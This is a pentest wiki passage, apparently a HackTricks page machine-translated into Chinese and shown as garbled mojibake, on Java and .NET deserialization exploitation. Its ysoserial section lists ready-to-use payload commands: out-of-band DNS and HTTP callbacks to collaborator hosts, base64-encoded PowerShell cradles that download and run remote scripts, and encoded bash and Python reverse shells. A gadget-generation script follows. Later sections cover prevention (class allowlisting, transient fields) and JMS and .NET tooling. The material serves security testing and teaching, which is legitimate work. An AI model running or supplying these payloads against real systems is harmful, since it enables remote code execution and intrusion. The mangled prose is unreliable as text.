ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨[**Freddy**](https://github.com/nccgroup/freddy)æ¥**æ£€æµ‹Burpä¸­çš„ååºåˆ—åŒ–**æ¼æ´ã€‚è¿™ä¸ªæ’ä»¶ä¸ä»…ä¼šæ£€æµ‹ä¸**`ObjectInputStream`**ç›¸å…³çš„æ¼æ´ï¼Œè¿˜ä¼šæ£€æµ‹æ¥è‡ª**Json**å’Œ**Yml**ååºåˆ—åŒ–åº“çš„æ¼æ´ã€‚åœ¨ä¸»åŠ¨æ¨¡å¼ä¸‹ï¼Œå®ƒä¼šå°è¯•ä½¿ç”¨sleepæˆ–DNS payloadæ¥ç¡®è®¤æ¼æ´ã€‚
[**ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°æ›´å¤šå…³äºFreddyçš„ä¿¡æ¯ã€‚**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**åºåˆ—åŒ–æµ‹è¯•**

å¹¶ä¸æ˜¯æ‰€æœ‰çš„æ£€æŸ¥éƒ½æ˜¯å…³äºæœåŠ¡å™¨æ˜¯å¦ä½¿ç”¨äº†ä»»ä½•å­˜åœ¨æ¼æ´çš„åº“ã€‚æœ‰æ—¶å€™ï¼Œä½ å¯èƒ½èƒ½å¤Ÿ**æ”¹å˜åºåˆ—åŒ–å¯¹è±¡å†…çš„æ•°æ®å¹¶ç»•è¿‡ä¸€äº›æ£€æŸ¥**ï¼ˆå¯èƒ½åœ¨webåº”ç”¨ä¸­æˆäºˆä½ ç®¡ç†å‘˜æƒé™ï¼‰ã€‚
å¦‚æœä½ å‘ç°ä¸€ä¸ªJavaåºåˆ—åŒ–å¯¹è±¡è¢«å‘é€åˆ°ä¸€ä¸ªwebåº”ç”¨ï¼Œ**ä½ å¯ä»¥ä½¿ç”¨**[**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper)**æ¥ä»¥æ›´æ˜“è¯»çš„æ ¼å¼æ‰“å°å‘é€çš„åºåˆ—åŒ–å¯¹è±¡**ã€‚çŸ¥é“ä½ å‘é€çš„æ•°æ®ä¼šæ›´å®¹æ˜“ä¿®æ”¹å®ƒå¹¶ç»•è¿‡ä¸€äº›æ£€æŸ¥ã€‚

### **åˆ©ç”¨**

#### **ysoserial**

æœ€è‘—åçš„ç”¨äºåˆ©ç”¨Javaååºåˆ—åŒ–çš„å·¥å…·æ˜¯[**ysoserial**](https://github.com/frohoff/ysoserial)ï¼ˆ[**åœ¨è¿™é‡Œä¸‹è½½**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)ï¼‰ã€‚ä½ ä¹Ÿå¯ä»¥è€ƒè™‘ä½¿ç”¨[**ysoserial-modified**](https://github.com/pimps/ysoserial-modified)ï¼Œå®ƒå…è®¸ä½ ä½¿ç”¨å¤æ‚çš„å‘½ä»¤ï¼ˆä¾‹å¦‚å¸¦ç®¡é“çš„å‘½ä»¤ï¼‰ã€‚
æ³¨æ„ï¼Œè¿™ä¸ªå·¥å…·**ä¸“æ³¨**äºåˆ©ç”¨**`ObjectInputStream`**ã€‚
æˆ‘ä¼š**å»ºè®®å…ˆä½¿ç”¨"URLDNS"** payload**åœ¨RCE** payloadä¹‹å‰æµ‹è¯•æ³¨å…¥æ˜¯å¦å¯èƒ½ã€‚æ— è®ºå¦‚ä½•ï¼Œè¯·æ³¨æ„ï¼Œå¯èƒ½"URLDNS" payloadä¸èµ·ä½œç”¨ï¼Œä½†å…¶ä»–RCE payloadå¯èƒ½æœ‰æ•ˆã€‚
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
åœ¨ä¸º **java.lang.Runtime.exec()** åˆ›å»ºæœ‰æ•ˆè½½è·æ—¶ï¼Œæ‚¨**ä¸èƒ½ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦**ï¼Œå¦‚ ">" æˆ– "|" æ¥é‡å®šå‘æ‰§è¡Œçš„è¾“å‡ºï¼Œ"$()" æ¥æ‰§è¡Œå‘½ä»¤ï¼Œç”šè‡³**ä¼ é€’å‚æ•°**ç»™å‘½ä»¤ï¼Œå‚æ•°ä¹‹é—´ç”±**ç©ºæ ¼**åˆ†éš”ï¼ˆæ‚¨å¯ä»¥æ‰§è¡Œ `echo -n "hello world"` ä½†ä¸èƒ½æ‰§è¡Œ `python2 -c 'print "Hello world"'`ï¼‰ã€‚ä¸ºäº†æ­£ç¡®ç¼–ç æœ‰æ•ˆè½½è·ï¼Œæ‚¨å¯ä»¥[ä½¿ç”¨è¿™ä¸ªç½‘é¡µ](http://www.jackson-t.ca/runtime-exec-payloads.html)ã€‚

éšæ„ä½¿ç”¨ä»¥ä¸‹è„šæœ¬æ¥åˆ›å»ºé€‚ç”¨äº Windows å’Œ Linux çš„**æ‰€æœ‰å¯èƒ½çš„ä»£ç æ‰§è¡Œ**æœ‰æ•ˆè½½è·ï¼Œç„¶ååœ¨æ˜“å—æ”»å‡»çš„ç½‘é¡µä¸Šæµ‹è¯•å®ƒä»¬ï¼š
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

æ‚¨å¯ä»¥**ä½¿ç”¨** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **ç»“åˆysoserialæ¥åˆ›å»ºæ›´å¤šçš„æ¼æ´åˆ©ç”¨å·¥å…·**ã€‚æœ‰å…³æ­¤å·¥å…·çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…å·¥å…·ä»‹ç»æ—¶çš„**æ¼”è®²å¹»ç¯ç‰‡**ï¼š[https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec**](https://github.com/mbechler/marshalsec) å¯ç”¨äºç”Ÿæˆæœ‰æ•ˆè½½è·ï¼Œä»¥åˆ©ç”¨Javaä¸­ä¸åŒçš„**Json**å’Œ**Yml**åºåˆ—åŒ–åº“ã€‚\
ä¸ºäº†ç¼–è¯‘é¡¹ç›®ï¼Œæˆ‘éœ€è¦å‘`pom.xml`ä¸­**æ·»åŠ **è¿™äº›**ä¾èµ–é¡¹**ï¼š
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**å®‰è£… maven**ï¼Œå¹¶**ç¼–è¯‘**é¡¹ç›®ï¼š
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

é˜…è¯»æ›´å¤šå…³äºè¿™ä¸ªJava JSONåº“çš„ä¿¡æ¯ï¼š[https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### å®éªŒå®¤

* å¦‚æœä½ æƒ³æµ‹è¯•ä¸€äº›ysoserial payloadsï¼Œä½ å¯ä»¥**è¿è¡Œè¿™ä¸ªwebapp**ï¼š[https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### ä¸ºä»€ä¹ˆ

Javaå–œæ¬¢åˆ°å¤„å‘é€åºåˆ—åŒ–å¯¹è±¡ã€‚ä¾‹å¦‚ï¼š

* åœ¨**HTTPè¯·æ±‚**ä¸­ â€“ å‚æ•°ã€ViewStateã€Cookiesï¼Œåº”æœ‰å°½æœ‰ã€‚
* **RMI** â€“ å¹¿æ³›ä½¿ç”¨çš„Java RMIåè®®å®Œå…¨åŸºäºåºåˆ—åŒ–
* **é€šè¿‡HTTPçš„RMI** â€“ è®¸å¤šJavaåšå®¢æˆ·ç«¯webåº”ç”¨ä½¿ç”¨è¿™ä¸ª â€“ å†æ¬¡æ˜¯100%åºåˆ—åŒ–å¯¹è±¡
* **JMX** â€“ åŒæ ·ï¼Œä¾èµ–äºé€šè¿‡ç½‘ç»œå‘é€çš„åºåˆ—åŒ–å¯¹è±¡
* **è‡ªå®šä¹‰åè®®** â€“ å‘é€å’Œæ¥æ”¶åŸå§‹Javaå¯¹è±¡æ˜¯å¸¸æ€ â€“ æˆ‘ä»¬å°†åœ¨ä¸€äº›å³å°†åˆ°æ¥çš„æ¼æ´ä¸­çœ‹åˆ°

### é¢„é˜²

#### ç¬æ€å¯¹è±¡

å®ç°äº†`Serializable`çš„ç±»å¯ä»¥å°†ç±»å†…éƒ¨ä¸åº”è¯¥è¢«åºåˆ—åŒ–çš„ä»»ä½•å¯¹è±¡å®ç°ä¸º`transient`ã€‚ä¾‹å¦‚ï¼š
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### é¿å…åºåˆ—åŒ–éœ€è¦å®ç° Serializable çš„ç±»

ç”±äºç»§æ‰¿å…³ç³»ï¼Œæ‚¨çš„åº”ç”¨ç¨‹åºå¯¹è±¡å¯èƒ½è¢«è¿«å®ç° `Serializable`ã€‚ä¸ºäº†ç¡®ä¿æ‚¨çš„åº”ç”¨ç¨‹åºå¯¹è±¡ä¸èƒ½è¢«ååºåˆ—åŒ–ï¼Œåº”è¯¥å£°æ˜ä¸€ä¸ª `readObject()` æ–¹æ³•ï¼ˆå¸¦æœ‰ `final` ä¿®é¥°ç¬¦ï¼‰ï¼Œè¯¥æ–¹æ³•å§‹ç»ˆæŠ›å‡ºå¼‚å¸¸ï¼š
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### åœ¨ååºåˆ—åŒ–å‰æ£€æŸ¥ååºåˆ—åŒ–çš„ç±»

`java.io.ObjectInputStream` ç±»ç”¨äºååºåˆ—åŒ–å¯¹è±¡ã€‚é€šè¿‡ç»§æ‰¿è¿™ä¸ªç±»å¯ä»¥åŠ å¼ºå…¶è¡Œä¸ºã€‚å¦‚æœä»¥ä¸‹æƒ…å†µé€‚ç”¨ï¼Œè¿™æ˜¯æœ€ä½³è§£å†³æ–¹æ¡ˆï¼š

* æ‚¨å¯ä»¥æ›´æ”¹æ‰§è¡Œååºåˆ—åŒ–çš„ä»£ç 
* æ‚¨çŸ¥é“æ‚¨æœŸæœ›ååºåˆ—åŒ–å“ªäº›ç±»

ä¸€èˆ¬çš„æƒ³æ³•æ˜¯è¦†ç›– [`ObjectInputStream.html#resolveClass()`](https://docs.oracle.com/javase/7/docs/api/java/io/ObjectInputStream.html#resolveClass\(java.io.ObjectStreamClass\)) æ–¹æ³•ï¼Œä»¥é™åˆ¶å…è®¸ååºåˆ—åŒ–çš„ç±»ã€‚

å› ä¸ºè¿™ä¸ªè°ƒç”¨å‘ç”Ÿåœ¨ `readObject()` è¢«è°ƒç”¨ä¹‹å‰ï¼Œæ‚¨å¯ä»¥ç¡®ä¿¡ï¼Œé™¤éç±»å‹æ˜¯æ‚¨å¸Œæœ›å…è®¸çš„ç±»å‹ï¼Œå¦åˆ™ä¸ä¼šå‘ç”Ÿä»»ä½•ååºåˆ—åŒ–æ´»åŠ¨ã€‚

è¿™é‡Œå±•ç¤ºäº†ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œå…¶ä¸­ `LookAheadObjectInputStream` ç±»ä¿è¯ä¸ååºåˆ—åŒ–ä»»ä½•ç±»å‹ï¼Œé™¤äº† `Bicycle` ç±»ï¼š
```java
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**ä½¿ç”¨ä»£ç†åŠ å›ºæ‰€æœ‰ java.io.ObjectInputStream çš„ä½¿ç”¨**

å¦‚æœæ‚¨ä¸æ‹¥æœ‰ä»£ç æˆ–ä¸èƒ½ç­‰å¾…è¡¥ä¸ï¼Œä½¿ç”¨ä»£ç†æ¥åŠ å›º `java.io.ObjectInputStream` æ˜¯æœ€ä½³è§£å†³æ–¹æ¡ˆã€‚\
é‡‡ç”¨è¿™ç§æ–¹æ³•ï¼Œæ‚¨åªèƒ½å°†å·²çŸ¥çš„æ¶æ„ç±»å‹åˆ—å…¥é»‘åå•ï¼Œè€Œä¸èƒ½å°†å®ƒä»¬åˆ—å…¥ç™½åå•ï¼Œå› ä¸ºæ‚¨ä¸çŸ¥é“å“ªäº›å¯¹è±¡æ­£åœ¨è¢«åºåˆ—åŒ–ã€‚

è¦å¯ç”¨è¿™äº›ä»£ç†ï¼Œåªéœ€æ·»åŠ ä¸€ä¸ªæ–°çš„ JVM å‚æ•°ï¼š
```
-javaagent:name-of-agent.jar
```
ç¤ºä¾‹ï¼š[rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

### å‚è€ƒèµ„æ–™

* ååºåˆ—åŒ–å’Œysoserialè®²åº§ï¼š[http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* å…³äºgadgetinspectorçš„è®²åº§ï¼š[https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) å’Œå¹»ç¯ç‰‡ï¼š[https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsecè®ºæ–‡ï¼š[https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Javaå’Œ.Net JSONååºåˆ—åŒ–**è®ºæ–‡ï¼š**[**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**ï¼Œ**è®²åº§ï¼š[https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) å’Œå¹»ç¯ç‰‡ï¼š[https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* ååºåˆ—åŒ–CVEsï¼š[https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

åœ¨ä»¥ä¸‹é¡µé¢ä¸­æ‰¾åˆ°**JNDI Injectionæ˜¯ä»€ä¹ˆï¼Œå¦‚ä½•é€šè¿‡RMIã€CORBAå’ŒLDAPæ»¥ç”¨å®ƒï¼Œä»¥åŠå¦‚ä½•åˆ©ç”¨log4shell**ï¼ˆä»¥åŠæ­¤æ¼æ´çš„ç¤ºä¾‹ï¼‰ï¼š

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Javaæ¶ˆæ¯æœåŠ¡

> **Javaæ¶ˆæ¯æœåŠ¡**ï¼ˆ**JMS**ï¼‰APIæ˜¯ä¸€ä¸ªç”¨äºåœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªå®¢æˆ·ç«¯ä¹‹é—´å‘é€æ¶ˆæ¯çš„Javaé¢å‘æ¶ˆæ¯çš„ä¸­é—´ä»¶APIã€‚å®ƒæ˜¯å¤„ç†ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜çš„ä¸€ä¸ªå®ç°ã€‚JMSæ˜¯Javaå¹³å°ä¼ä¸šç‰ˆï¼ˆJava EEï¼‰çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ç”±Sun Microsystemså¼€å‘çš„è§„èŒƒå®šä¹‰ï¼Œä½†æ­¤åä¸€ç›´ç”±Javaç¤¾åŒºè¿‡ç¨‹æŒ‡å¯¼ã€‚å®ƒæ˜¯ä¸€ä¸ªå…è®¸åŸºäºJava EEçš„åº”ç”¨ç¨‹åºç»„ä»¶åˆ›å»ºã€å‘é€ã€æ¥æ”¶å’Œè¯»å–æ¶ˆæ¯çš„æ¶ˆæ¯æ ‡å‡†ã€‚å®ƒå…è®¸åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºçš„ä¸åŒç»„ä»¶ä¹‹é—´çš„é€šä¿¡æ˜¯æ¾æ•£è€¦åˆçš„ã€å¯é çš„å’Œå¼‚æ­¥çš„ã€‚ï¼ˆæ¥è‡ª[Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)ï¼‰ã€‚

### äº§å“

æœ‰å‡ ç§äº§å“ä½¿ç”¨è¿™ç§ä¸­é—´ä»¶å‘é€æ¶ˆæ¯ï¼š

![](<../../.gitbook/assets/image (291).png>)

![](<../../.gitbook/assets/image (292).png>)

### åˆ©ç”¨

æ‰€ä»¥ï¼ŒåŸºæœ¬ä¸Šæœ‰ä¸€**å †æœåŠ¡ä»¥å±é™©çš„æ–¹å¼ä½¿ç”¨JMS**ã€‚å› æ­¤ï¼Œå¦‚æœä½ æœ‰**è¶³å¤Ÿçš„æƒé™**å‘è¿™äº›æœåŠ¡å‘é€æ¶ˆæ¯ï¼ˆé€šå¸¸ä½ éœ€è¦æœ‰æ•ˆçš„å‡­æ®ï¼‰ï¼Œä½ å¯ä»¥å‘é€**è¢«æ¶ˆè´¹è€…/è®¢é˜…è€…ååºåˆ—åŒ–çš„æ¶æ„å¯¹è±¡åºåˆ—åŒ–**ã€‚\
è¿™æ„å‘³ç€åœ¨è¿™ç§åˆ©ç”¨ä¸­ï¼Œæ‰€æœ‰å°†è¦ä½¿ç”¨è¯¥æ¶ˆæ¯çš„**å®¢æˆ·ç«¯éƒ½å°†è¢«æ„ŸæŸ“**ã€‚

ä½ åº”è¯¥è®°ä½ï¼Œå³ä½¿ä¸€ä¸ªæœåŠ¡æ˜¯è„†å¼±çš„ï¼ˆå› ä¸ºå®ƒä¸å®‰å…¨åœ°ååºåˆ—åŒ–ç”¨æˆ·è¾“å…¥ï¼‰ï¼Œä½ ä»ç„¶éœ€è¦æ‰¾åˆ°æœ‰æ•ˆçš„å°å·¥å…·æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚

å·¥å…·[JMET](https://github.com/matthiaskaiser/jmet)è¢«åˆ›å»ºæ¥**è¿æ¥å¹¶æ”»å‡»è¿™äº›æœåŠ¡ï¼Œå‘é€ä½¿ç”¨å·²çŸ¥å°å·¥å…·åºåˆ—åŒ–çš„å¤šä¸ªæ¶æ„å¯¹è±¡**ã€‚å¦‚æœæœåŠ¡ä»ç„¶è„†å¼±ï¼Œå¹¶ä¸”ä»»ä½•ä½¿ç”¨çš„å°å·¥å…·éƒ½åœ¨è„†å¼±çš„åº”ç”¨ç¨‹åºä¸­ï¼Œè¿™äº›æ¼æ´å°†èµ·ä½œç”¨ã€‚

### å‚è€ƒèµ„æ–™

* JMETè®²åº§ï¼š[https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* å¹»ç¯ç‰‡ï¼š[https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Netåœ¨ååºåˆ—åŒ–æ¼æ´çš„å·¥ä½œæ–¹å¼ä¸Šä¸Javaç±»ä¼¼ï¼š**æ¼æ´**å°†**æ»¥ç”¨å°å·¥å…·**ï¼Œè¿™äº›å°å·¥å…·åœ¨å¯¹è±¡**è¢«ååºåˆ—åŒ–æ—¶æ‰§è¡Œ**ä¸€äº›æœ‰è¶£çš„**ä»£ç **ã€‚

### æŒ‡çº¹

#### WhiteBox

æœç´¢æºä»£ç ä¸­çš„ä»¥ä¸‹æœ¯è¯­ï¼š

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

å¯»æ‰¾ä»»ä½•ç”±ç”¨æˆ·æ§åˆ¶çš„å˜é‡è®¾ç½®ç±»å‹çš„åºåˆ—åŒ–å™¨ã€‚

#### BlackBox

ä½ å¯ä»¥æœç´¢Base64ç¼–ç çš„å­—ç¬¦ä¸²**AAEAAAD/////**æˆ–ä»»ä½•å…¶ä»–å¯èƒ½åœ¨åç«¯**è¢«ååºåˆ—åŒ–**çš„ä¸œè¥¿ï¼Œå…è®¸ä½ æ§åˆ¶ååºåˆ—åŒ–ç±»å‹**ã€‚**ä¾‹å¦‚ï¼ŒåŒ…å«`TypeObject`æˆ–`$type`çš„**JSON**æˆ–**XML**ã€‚

### ysoserial.net

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥ä½¿ç”¨å·¥å…·[**ysoserial.net**](https://github.com/pwntester/ysoserial.net)æ¥**åˆ›å»ºååºåˆ—åŒ–æ¼æ´**ã€‚ä¸‹è½½gitä»“åº“åï¼Œä½ åº”è¯¥ä½¿ç”¨Visual Studioç­‰å·¥å…·**ç¼–è¯‘è¯¥å·¥å…·**ã€‚

å¦‚æœä½ æƒ³äº†è§£**ysoserial.netæ˜¯å¦‚ä½•åˆ›å»ºå®ƒçš„æ¼æ´**ï¼Œä½ å¯ä»¥[**æŸ¥çœ‹è¿™ä¸ªé¡µé¢ï¼Œå…¶ä¸­è§£é‡Šäº†ObjectDataProviderå°å·¥å…·+ExpandedWrapper+Json.Netæ ¼å¼åŒ–å™¨**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md)ã€‚

**ysoserial.net**çš„ä¸»è¦é€‰é¡¹æ˜¯ï¼š**`--gadget`**ï¼Œ**`--formatter`**ï¼Œ**`--output`** å’Œ **`--plugin`**ã€‚

* **`--gadget`** ç”¨äºæŒ‡ç¤ºè¦æ»¥ç”¨çš„å°å·¥å…·ï¼ˆæŒ‡ç¤ºåœ¨ååºåˆ—åŒ–æœŸé—´å°†è¢«æ»¥ç”¨ä»¥æ‰§è¡Œå‘½ä»¤çš„ç±»/å‡½æ•°ï¼‰ã€‚
